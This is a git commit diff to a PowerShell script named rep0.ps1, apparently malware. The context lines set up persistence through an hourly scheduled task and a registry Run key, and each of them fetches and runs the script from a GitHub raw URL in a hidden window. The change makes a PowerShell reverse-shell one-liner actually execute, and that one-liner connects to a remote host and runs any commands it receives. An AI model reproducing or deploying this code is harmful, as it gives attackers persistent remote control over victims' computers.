dce89e851184e41d3cbe51ee53c334ca941f241b
rindonbrg <140368244+rindonbrg@users.noreply.github.com>
2023-07-27 19:59:56 -0700

    1

--- rep0.ps1
+++ rep0.ps1
@@ -16,4 +16,4 @@ schtasks /Create /TN "Start" /SC HOURLY /MO 1 /TR "cmd /c powershell -w hi -c \"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /t REG_SZ /d "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/rep0.ps1 -UseBasicParsing)\""" /F
 
 
-"$c=New-Object System.Net.Sockets.TCPClient('$i', $p); $s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($z=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$z);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbB=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbB,0,$sbB.Length);$s.Flush()};$c.Close()"
+IEX "$c=New-Object System.Net.Sockets.TCPClient('$i', $p); $s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($z=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$z);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbB=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbB,0,$sbB.Length);$s.Flush()};$c.Close()"
